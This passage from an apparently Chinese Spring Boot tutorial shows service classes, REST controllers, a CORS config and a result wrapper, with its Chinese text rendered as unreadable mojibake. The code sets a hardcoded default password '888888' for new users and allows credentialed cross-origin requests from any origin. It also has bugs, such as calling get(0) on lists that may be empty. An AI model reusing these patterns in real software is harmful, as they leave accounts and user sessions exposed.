å®ç°serviceImpl</h4><p>è¿™ä¸€éƒ¨åˆ†ä¸Šé¢çš„æ¥å£çš„å…·ä½“å®ç°ï¼Œå®ç°çš„æ˜¯ä¸šåŠ¡é€»è¾‘ï¼Œç„¶åè°ƒç”¨ä¸Šå±‚Daoå·²ç»å®ç°çš„æ¥å£</p><h5 id="personserviceimpl"><a class="markdownIt-Anchor" href="#personserviceimpl"></a> PersonServiceImpl</h5><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.zino.ex4spring.service.impl;<br><br><span class="hljs-keyword">import</span> com.zino.ex4spring.domain.Person;<br><span class="hljs-keyword">import</span> com.zino.ex4spring.domain.User;<br><span class="hljs-keyword">import</span> com.zino.ex4spring.repository.PersonDao;<br><span class="hljs-keyword">import</span> com.zino.ex4spring.repository.UserDao;<br><span class="hljs-keyword">import</span> com.zino.ex4spring.service.PersonService;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Service;<br><br><span class="hljs-keyword">import</span> javax.annotation.Resource;<br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-meta">@Service</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PersonServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">PersonService</span> </span>&#123;<br>    <span class="hljs-meta">@Resource</span><br>    <span class="hljs-keyword">private</span> PersonDao personDao;<br>    <span class="hljs-meta">@Resource</span><br>    <span class="hljs-keyword">private</span> UserDao userDao;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">insert</span><span class="hljs-params">(Person person)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> u=userDao.getByUsername(person.getUsername()).size();<br>        <span class="hljs-keyword">int</span> p=personDao.getByUsername(person.getUsername()).size();<br>        <span class="hljs-keyword">if</span>(u!=<span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">if</span>(p!=<span class="hljs-number">0</span>)&#123;<br>                personDao.update(person);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<span class="hljs-comment">//è¯¥è®°å½•å·²å­˜åœ¨personè¡¨å’Œuserè¡¨ï¼Œæ›´æ–°personè¡¨æ•°æ®</span><br>            &#125;<br>            <span class="hljs-keyword">else</span> &#123;<br>                personDao.insert(person);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<span class="hljs-comment">//è¯¥è®°å½•å·²å­˜åœ¨usersè¡¨ï¼Œä¸å­˜åœ¨personè¡¨ï¼Œæ’å…¥personè¡¨</span><br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">//ä¸å­˜åœ¨userï¼Œæ’å…¥userè¡¨,userè¡¨é»˜è®¤å¯†ç ä¸º888888</span><br>            userDao.insert(<span class="hljs-keyword">new</span> User(person.getUsername(),<span class="hljs-string">&quot;888888&quot;</span>));<br>            <span class="hljs-keyword">if</span>(p!=<span class="hljs-number">0</span>)&#123;<br>                personDao.update(person);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;<span class="hljs-comment">//è¯¥è®°å½•ä¸å­˜åœ¨userè¡¨ï¼Œå­˜åœ¨personè¡¨ï¼Œæ’å…¥userè¡¨ï¼Œæ›´æ–°personè¡¨æ•°æ®</span><br>            &#125;<br>            <span class="hljs-keyword">else</span> &#123;<br>                personDao.insert(person);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">3</span>;<span class="hljs-comment">//è¯¥è®°å½•ä¸å­˜åœ¨usersè¡¨å’Œpersonè¡¨ï¼Œæ’å…¥userè¡¨å’Œpersonè¡¨</span><br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;Person&gt; <span class="hljs-title">getList</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> personDao.getList();<br>    &#125;<br><br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;Person&gt; <span class="hljs-title">getByUsername</span><span class="hljs-params">(String username)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> personDao.getByUsername(username);<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h5 id="userserviceimpl"><a class="markdownIt-Anchor" href="#userserviceimpl"></a> UserServiceImpl</h5><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.zino.ex4spring.service.impl;<br><br><span class="hljs-keyword">import</span> com.zino.ex4spring.domain.User;<br><span class="hljs-keyword">import</span> com.zino.ex4spring.repository.PersonDao;<br><span class="hljs-keyword">import</span> com.zino.ex4spring.repository.UserDao;<br><span class="hljs-keyword">import</span> com.zino.ex4spring.service.UserSersive;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Service;<br><br><span class="hljs-keyword">import</span> javax.annotation.Resource;<br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-meta">@Service</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">UserSersive</span> </span>&#123;<br>    <span class="hljs-meta">@Resource</span><br>    <span class="hljs-keyword">private</span> PersonDao personDao;<br>    <span class="hljs-meta">@Resource</span><br>    <span class="hljs-keyword">private</span> UserDao userDao;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> User <span class="hljs-title">insert</span><span class="hljs-params">(User user)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> userDao.insert(user);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title">getList</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> userDao.getList();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title">getByUsername</span><span class="hljs-params">(String username)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> userDao.getByUsername(username);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> User <span class="hljs-title">delete</span><span class="hljs-params">(String username)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(userDao.getByUsername(username).size()!=<span class="hljs-number">0</span>)&#123;<br>            userDao.delete(username);<br>            personDao.delete(username);<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> User(username,<span class="hljs-string">&quot;******&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h3 id="3-æ§åˆ¶å±‚"><a class="markdownIt-Anchor" href="#3-æ§åˆ¶å±‚"></a> 3) æ§åˆ¶å±‚</h3><h4 id="personcontroller"><a class="markdownIt-Anchor" href="#personcontroller"></a> PersonController</h4><ul><li>æ³¨è§£<code>@RequestMapping</code>ä¸­çš„â€/personâ€æ˜¯è¿™ä¸ªæ§åˆ¶å™¨ç±»çš„åŸºè·¯ç”±</li><li><code>@PostMapping(&quot;/add&quot;)</code>è¡¨ç¤ºå¤„ç†postè¯·æ±‚ï¼Œè·¯ç”±ä¸º/perosn/add</li><li><code>@GetMapping(&quot;/list&quot;)</code>è¡¨ç¤ºå¤„ç†getè¯·æ±‚ï¼Œè·¯ç”±ä¸º/person/list</li></ul><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.zino.ex4spring.controller;<br><br><span class="hljs-keyword">import</span> com.zino.ex4spring.domain.Person;<br><span class="hljs-keyword">import</span> com.zino.ex4spring.service.PersonService;<br><span class="hljs-keyword">import</span> com.zino.ex4spring.utils.Result;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.*;<br><br><span class="hljs-keyword">import</span> javax.annotation.Resource;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping(&quot;/person&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PersonController</span> </span>&#123;<br>    <span class="hljs-meta">@Resource</span><br>    <span class="hljs-keyword">private</span> PersonService personService;<br>    <br>    <span class="hljs-meta">@PostMapping(&quot;/add&quot;)</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Result&lt;Person&gt; <span class="hljs-title">addController</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> Person person)</span></span>&#123;<br>        <span class="hljs-keyword">int</span> t= personService.insert(person);<br>        <span class="hljs-keyword">if</span>(t == <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">return</span> Result.success(person,<span class="hljs-string">&quot;username:&quot;</span>+person.getUsername()+ <span class="hljs-string">&quot;å·²å­˜åœ¨personè¡¨å’Œuserè¡¨ï¼Œæ›´æ–°personè¡¨æ•°æ®&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(t==<span class="hljs-number">1</span>)&#123;<br>            <span class="hljs-keyword">return</span> Result.success(person,<span class="hljs-string">&quot;username:&quot;</span>+person.getUsername()+ <span class="hljs-string">&quot;å·²å­˜åœ¨usersè¡¨ï¼Œä¸å­˜åœ¨personè¡¨ï¼Œæ’å…¥personè¡¨&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(t==<span class="hljs-number">2</span>)&#123;<br>            <span class="hljs-keyword">return</span> Result.success(person,<span class="hljs-string">&quot;username:&quot;</span>+person.getUsername()+ <span class="hljs-string">&quot;ä¸å­˜åœ¨userè¡¨ï¼Œå­˜åœ¨personè¡¨ï¼Œæ’å…¥userè¡¨ï¼Œæ›´æ–°personè¡¨æ•°æ®&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(t==<span class="hljs-number">3</span>)&#123;<br>            <span class="hljs-keyword">return</span> Result.success(person,<span class="hljs-string">&quot;username:&quot;</span>+person.getUsername()+ <span class="hljs-string">&quot;ä¸å­˜åœ¨usersè¡¨å’Œpersonè¡¨ï¼Œæ’å…¥userè¡¨å’Œpersonè¡¨&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> Result.error(<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-string">&quot;æ’å…¥å¤±è´¥ï¼&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/list&quot;)</span><br>    <span class="hljs-keyword">public</span> Result&lt;List&lt;Person&gt;&gt; listController()&#123;<br>        List&lt;Person&gt; list =personService.getList();<br>        <span class="hljs-keyword">if</span>(!list.isEmpty())&#123;<br>            <span class="hljs-keyword">return</span> Result.success(list,<span class="hljs-string">&quot;personè¡¨æŸ¥çœ‹æˆåŠŸï¼&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> Result.error(<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-string">&quot;personè¡¨æŸ¥çœ‹å¤±è´¥ï¼&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">@GetMapping(&quot;/query&quot;)</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Result&lt;Person&gt; <span class="hljs-title">queryController</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String username)</span></span>&#123;<br>        Person person =personService.getByUsername(username).get(<span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span>(person!=<span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">return</span> Result.success(person,<span class="hljs-string">&quot;personè¡¨æŸ¥æ‰¾æˆåŠŸï¼&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> Result.error(<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-string">&quot;personè¡¨æŸ¥æ‰¾å¤±è´¥ï¼&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h4 id="usercontroller"><a class="markdownIt-Anchor" href="#usercontroller"></a> UserController</h4><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.zino.ex4spring.controller;<br><br><br><span class="hljs-keyword">import</span> com.zino.ex4spring.domain.User;<br><span class="hljs-keyword">import</span> com.zino.ex4spring.service.UserSersive;<br><span class="hljs-keyword">import</span> com.zino.ex4spring.utils.Result;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.*;<br><span class="hljs-keyword">import</span> javax.annotation.Resource;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping(&quot;/user&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserController</span> </span>&#123;<br>    <span class="hljs-meta">@Resource</span><br>    <span class="hljs-keyword">private</span> UserSersive userSersive;<br><br>    <span class="hljs-meta">@PostMapping(&quot;/delete&quot;)</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Result&lt;User&gt; <span class="hljs-title">deleteController</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;username&quot;)</span> String username)</span></span>&#123;<br>        User user= userSersive.delete(username);<br>        <span class="hljs-keyword">if</span>(user!=<span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">return</span> Result.success(user,<span class="hljs-string">&quot;ç”¨æˆ·&quot;</span>+username+<span class="hljs-string">&quot;åˆ é™¤æˆåŠŸ&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> Result.error(<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-string">&quot;åˆ é™¤å¤±è´¥ï¼Œç”¨æˆ·&quot;</span>+username+<span class="hljs-string">&quot;ä¸å­˜åœ¨&quot;</span>);<br>        &#125;<br><br>    &#125;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/list&quot;)</span><br>    <span class="hljs-keyword">public</span> Result&lt;List&lt;User&gt;&gt; listController()&#123;<br>        List&lt;User&gt; list =userSersive.getList();<br>        <span class="hljs-keyword">if</span>(!list.isEmpty())&#123;<br>            <span class="hljs-keyword">return</span> Result.success(list,<span class="hljs-string">&quot;userè¡¨æŸ¥çœ‹æˆåŠŸï¼&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> Result.error(<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-string">&quot;userè¡¨æŸ¥çœ‹å¤±è´¥ï¼&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">@GetMapping(&quot;/query&quot;)</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Result&lt;User&gt; <span class="hljs-title">queryController</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> String username)</span></span>&#123;<br>        User user =userSersive.getByUsername(username).get(<span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span>(user!=<span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">return</span> Result.success(user,<span class="hljs-string">&quot;userè¡¨æŸ¥çœ‹æˆåŠŸï¼&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> Result.error(<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-string">&quot;userè¡¨æŸ¥çœ‹å¤±è´¥ï¼&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="4è·¨åŸŸé…ç½®å’Œå·¥å…·ç±»"><a class="markdownIt-Anchor" href="#4è·¨åŸŸé…ç½®å’Œå·¥å…·ç±»"></a> 4)è·¨åŸŸé…ç½®å’Œå·¥å…·ç±»</h3><h4 id="globalcorsconfigè·¨åŸŸé…ç½®"><a class="markdownIt-Anchor" href="#globalcorsconfigè·¨åŸŸé…ç½®"></a> GlobalCorsConfigè·¨åŸŸé…ç½®</h4><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.zino.ex4spring.config;<br><br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Bean;<br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.config.annotation.CorsRegistry;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.config.annotation.WebMvcConfigurer;<br><br><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GlobalCorsConfig</span> </span>&#123;<br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> WebMvcConfigurer <span class="hljs-title">corsConfigurer</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> WebMvcConfigurer() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">addCorsMappings</span><span class="hljs-params">(CorsRegistry registry)</span> </span>&#123;<br>                registry.addMapping(<span class="hljs-string">&quot;/**&quot;</span>)    <span class="hljs-comment">//æ·»åŠ æ˜ å°„è·¯å¾„ï¼Œâ€œ/**â€è¡¨ç¤ºå¯¹æ‰€æœ‰çš„è·¯å¾„å®è¡Œå…¨å±€è·¨åŸŸè®¿é—®æƒé™çš„è®¾ç½®</span><br>                        .allowedOriginPatterns(<span class="hljs-string">&quot;*&quot;</span>)    <span class="hljs-comment">//å¼€æ”¾å“ªäº›ipã€ç«¯å£ã€åŸŸåçš„è®¿é—®æƒé™</span><br>                        .allowCredentials(<span class="hljs-keyword">true</span>)  <span class="hljs-comment">//æ˜¯å¦å…è®¸å‘é€Cookieä¿¡æ¯</span><br>                        .allowedMethods(<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;POST&quot;</span>, <span class="hljs-string">&quot;PUT&quot;</span>, <span class="hljs-string">&quot;DELETE&quot;</span>)     <span class="hljs-comment">//å¼€æ”¾å“ªäº›Httpæ–¹æ³•ï¼Œå…è®¸è·¨åŸŸè®¿é—®</span><br>                        .allowedHeaders(<span class="hljs-string">&quot;*&quot;</span>)     <span class="hljs-comment">//å…è®¸HTTPè¯·æ±‚ä¸­çš„æºå¸¦å“ªäº›Headerä¿¡æ¯</span><br>                        .exposedHeaders(<span class="hljs-string">&quot;*&quot;</span>);   <span class="hljs-comment">//æš´éœ²å“ªäº›å¤´éƒ¨ä¿¡æ¯ï¼ˆå› ä¸ºè·¨åŸŸè®¿é—®é»˜è®¤ä¸èƒ½è·å–å…¨éƒ¨å¤´éƒ¨ä¿¡æ¯ï¼‰</span><br>            &#125;<br>        &#125;;<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h4 id="resultç»“æœæ§åˆ¶"><a class="markdownIt-Anchor" href="#resultç»“æœæ§åˆ¶"></a> Resultç»“æœæ§åˆ¶</h4><p>å·¥å…·ç±»Resultçš„ä½œç”¨æ˜¯ä½œä¸ºè¿”å›ç»™å‰ç«¯çš„ç»Ÿä¸€åçš„å¯¹è±¡ã€‚ä¹Ÿå°±æ˜¯è¯´è¿”å›ç»™å‰ç«¯çš„éƒ½æ˜¯Resultå¯¹è±¡ï¼Œåªæ˜¯å¯¹è±¡ä¸­çš„å±æ€§ä¸å¤ªä¸€æ ·ï¼Œè¿™æ ·æ–¹ä¾¿å‰ç«¯å›ºå®šæ¥æ”¶æ ¼å¼ã€‚</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.zino.ex4spring.utils;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Result</span>&lt;<span class="hljs-title">T</span>&gt; </span>&#123;<br>    <span class="hljs-keyword">private</span> String code;<br>    <span class="hljs-keyword">private</span> String msg;<br>    <span class="hljs-keyword">private</span> T data;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getCode</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> code;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setCode</span><span class="hljs-params">(String code)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.code = code;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getMsg</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> msg;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setMsg</span><span class="hljs-params">(String msg)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.msg = msg;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> T <span class="hljs-title">getData</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> data;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setData</span><span class="hljs-params">(T data)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.data = data;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Result</span><span class="hljs-params">()</span> </span>&#123;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Result</span><span class="hljs-params">(T data)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.data = data;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Result <span class="hljs-title">success</span><span class="hljs-params">()</span> </span>&#123;<br>        Result result = <span class="hljs-keyword">new</span> Result&lt;&gt;();<br>        result.setCode(<span class="hljs-string">&quot;0&quot;</span>);<br>        result.setMsg(<span class="hljs-string">&quot;æˆåŠŸ&quot;</span>);<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br><br>   